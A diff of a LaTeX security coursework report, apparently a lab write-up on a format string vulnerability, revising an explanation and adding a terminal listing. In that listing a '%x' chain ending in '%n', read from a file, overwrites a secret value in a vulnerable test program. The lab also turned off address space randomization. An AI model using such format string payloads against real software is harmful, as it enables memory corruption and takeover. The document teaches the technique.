@@ -254,18 +254,20 @@ int main()
 		write(fp, buf, size);
 		close(fp);
 	} else {
-	printf("Open failed!\n");
+		printf("Open failed!\n");
+	}
 }
 \end{lstlisting}
 
-In order to execute this task we had to disable virtual memory randomization, so that at every consecutive execution of our program the memory addresses of the \texttt{secret} would stay exactly the same. We needed the address to stay to same, in order to run the vulnerable program once, take note of the address, run our program \texttt{write\_string} that creates a file to be used as input, and run vulnerable program again and be sure that the address space is exactly as during previous run.
+In order to execute this task we had to disable virtual address space randomization, so that at every consecutive execution of our program the memory addresses of the \texttt{secret} would stay exactly the same. We needed the address to stay to same, in order to run the vulnerable program once, take note of the address, run our program \texttt{write\_string} that creates a file to be used as input, and run vulnerable program again and be sure that the address space is exactly as during previous run.
+After turning off address randomization, we had to add an extra memory allocation to the vulnerable program, because the address we were given contained \texttt{0x0C} character which is 'form feed' symbol in ASCII, and \texttt{printf} would not treat entire address as a single value.
 
 \vspace{1em}
 \lstset{
 	captionpos=b,
 	frame=single,
 	language=BASH,
-	caption=Example of overwriting memory with a specified value,
+	caption=Example of printing memory using a file as standard input,
 	label=printf:writefile1,
 	breaklines=true,
 }
@@ -284,7 +286,32 @@ The original secrets: 0x44 -- 0x55
 The new secrets:      0x44 -- 0x55
 \end{lstlisting}
 
-In the listing~\ref{printf:writefile1} we can see that we run program \texttt{write\_string} which writes into 'myfile'. Then we use myfile as standard input to my program. First four bytes of \texttt{user\_input} now will contain the address of \texttt{secret[1]}. We then specify the rest of format specifier as in previous part of this task. Note that now we have to pop more values off the stack, because \texttt{user\input} is defined at the beginning of the method so it gets pushed to the stack earlier. As the result, when \texttt{user\_input} is at top of the stack and \texttt{printf} 'executes' \texttt{\%s} we print the location stored at the beginning of this buffer. 
+In the listing~\ref{printf:writefile1} we can see that we run program \texttt{write\_string} which creates and writes into a file called 'mystring'. The program asks the user for input what makes it possible to provide the rest of format specifier as in previous the part of this task. Then we use the file as standard input to the vulnerable program. First four bytes of \texttt{user\_input} now will contain the address of \texttt{secret[1]} which we hardcoded at the beginning of the file and the rest will be the format specifier for \texttt{printf}. NB now we have to pop more values off the stack, because \texttt{user\input} is defined at the beginning of the method so it gets pushed to the stack earlier. As the result, when \texttt{user\_input} is at top of the stack and \texttt{printf} 'executes' \texttt{\%s} we print the location stored at the beginning of this buffer. In the similar way we can overwrite memory at specified location, simply by providing similar format specifier as in previous part, i.e. containing \texttt{\%n}.
+
+\vspace{1em}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=BASH,
+	caption=Example of overwriting memory with a specified value using a file as standard input,
+	label=printf:writefile2,
+	breaklines=true,
+}
+\begin{lstlisting}
+seed@seed-desktop:~/cwk2$ ./write_string
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.ABCD%n    
+The string length is 40
+seed@seed-desktop:~/cwk2$ ./vul < mystring
+The variable secret’s address is 0xbffff4e8 (on stack)
+The variable secret’s value is 0x 804b018 (on heap)
+secret[0]’s address is 0x 804b018 (on heap)
+secret[1]’s address is 0x 804b01c (on heap)
+Please enter a string
+bffff4ec.bffff560.bffff554.bffff5f4.0.0.bffff5a0.b7fff670.80482bf.804b018.ABCD
+The original secrets: 0x44 -- 0x55
+The new secrets:      0x44 -- 0x52
+\end{lstlisting}
+
 
 
 \section{\texttt{chroot} vulnerability}
